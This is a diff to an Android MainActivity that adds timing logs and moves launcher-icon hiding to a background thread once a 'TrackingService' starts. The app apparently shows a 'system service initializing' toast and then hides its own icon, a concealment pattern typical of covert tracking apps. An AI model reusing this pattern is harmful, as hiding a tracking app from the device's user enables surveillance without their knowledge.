@@ -100,7 +100,13 @@ public class MainActivity extends Activity {
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
+        long createStartedAt = android.os.SystemClock.elapsedRealtime();
         super.onCreate(savedInstanceState);
+        FileLogger.log(this, "MAIN", "权限引导 Activity 创建，pid=" + android.os.Process.myPid());
+        mainHandler.post(() -> {
+            long elapsed = android.os.SystemClock.elapsedRealtime() - createStartedAt;
+            if (elapsed >= 500L) FileLogger.log(this, "MAIN", "Activity 首帧回调耗时 elapsedMs=" + elapsed);
+        });
         if (getIntent() != null && getIntent().getCategories() != null
                 && getIntent().getCategories().contains(Intent.CATEGORY_LAUNCHER)) {
             Toast.makeText(this, "🛡️ 系统服务初始化中", Toast.LENGTH_SHORT).show();
@@ -405,6 +411,8 @@ public class MainActivity extends Activity {
     @Override
     public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+        FileLogger.log(this, "MAIN", "系统权限结果回调 requestCode=" + requestCode
+                + " resultCount=" + (grantResults == null ? 0 : grantResults.length));
 
         // ★ 工业级避坑：将解锁动作推迟到系统权限 UI 彻底退场后的下一个 Looper 循环
         // 确保系统权限 UI 的退场动画和 onResume 彻底执行完毕后，再行释放锁
@@ -631,24 +639,42 @@ public class MainActivity extends Activity {
     }
 
     private void finishWithToast(String msg, int duration) {
+        // Submit the foreground service while this Activity is still foregrounded.
+        // PackageManager component changes may perform synchronous binder/package work;
+        // do not execute that work on the permission UI thread.
+        long serviceStartAt = android.os.SystemClock.elapsedRealtime();
         boolean serviceOk = startTrackingServiceOnly();
+        long serviceStartElapsed = android.os.SystemClock.elapsedRealtime() - serviceStartAt;
+        FileLogger.log(this, "MAIN", "TrackingService 启动请求提交 serviceOk=" + serviceOk
+                + " elapsedMs=" + serviceStartElapsed);
         if (serviceOk) {
-            try {
-                hideLauncherIcon();
-            } catch (Exception e) {
-                FileLogger.log(this, "ICON", "隐藏图标失败: " + e);
-            }
+            final Context appContext = getApplicationContext();
+            Thread iconThread = new Thread(() -> {
+                long startedAt = android.os.SystemClock.elapsedRealtime();
+                try {
+                    FileLogger.log(appContext, "ICON", "后台执行桌面图标隐藏");
+                    boolean hidden = LauncherIconUtils.setLauncherIconVisible(appContext, false);
+                    FileLogger.log(appContext, "ICON", hidden
+                            ? "✅ 桌面图标已隐藏"
+                            : "⚠️ 桌面图标隐藏失败，保留服务运行");
+                } catch (Exception e) {
+                    FileLogger.log(appContext, "ICON", "隐藏图标失败: " + e.getClass().getSimpleName());
+                } finally {
+                    long elapsed = android.os.SystemClock.elapsedRealtime() - startedAt;
+                    if (elapsed >= 500L) {
+                        FileLogger.log(appContext, "MAIN", "桌面图标切换耗时 elapsedMs=" + elapsed);
+                    }
+                }
+            }, "MainActivity-HideLauncherIcon");
+            iconThread.setPriority(Thread.NORM_PRIORITY - 1);
+            iconThread.start();
         } else {
             msg = msg + "\n⚠️ 服务启动失败，已保留桌面图标";
             duration = Toast.LENGTH_LONG;
         }
-        
-        Toast.makeText(getApplicationContext(), msg, duration).show();
-        finish();
-    }
 
-    private void hideLauncherIcon() {
-        FileLogger.log(this, "ICON", "隐藏桌面图标");
-        LauncherIconUtils.setLauncherIconVisible(this, false);
+        Toast.makeText(getApplicationContext(), msg, duration).show();
+        FileLogger.log(this, "MAIN", "权限引导结束，Activity 准备退出 serviceStarted=" + serviceOk);
+        finish();
     }
 }
